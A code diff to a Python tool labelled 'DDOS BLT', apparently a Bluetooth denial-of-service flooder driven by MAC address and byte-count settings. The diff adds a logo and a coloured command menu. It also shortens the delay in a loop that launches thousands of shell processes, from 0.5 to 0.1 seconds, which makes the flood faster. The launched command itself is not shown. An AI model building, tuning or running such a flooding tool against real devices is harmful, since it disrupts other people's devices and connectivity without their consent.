@@ -1,6 +1,8 @@
 import subprocess
 import time
 
+from ui import logo, Bcolors
+
 
 class Interface:
     def __init__(self, mac_order=None, bytes_=600):
@@ -28,7 +30,7 @@ class Interface:
 
         for i in range(1, 10000):
             subprocess.Popen(xterm_1, shell=True)
-            time.sleep(0.5)
+            time.sleep(0.1)
             print(f'Progress - {i}')
 
     def set_bytes(self, bytes_):
@@ -41,10 +43,12 @@ class Interface:
         print(f'MAC-order: {self.mac_order}\nBytes: {self.bytes}\n')
 
     def __start(self):
+        logo()
         active = None
+        print(Bcolors.OKGREEN + 'Command for DDOS BLT:')
+        print('set-mac <mac_order>\nset-bytes <count bytes>\nshow\nfind\nrun')
+        print('=' * 40, end='\n\n')
         while active != 'stop':
-            print('set-mac <mac_order>\nset-bytes <count bytes>\nshow\nfind\nrun')
-            print('#' * 40)
             active = input()
             if 'set-mac ' in active:
                 self.set_mac_order(active[8:])
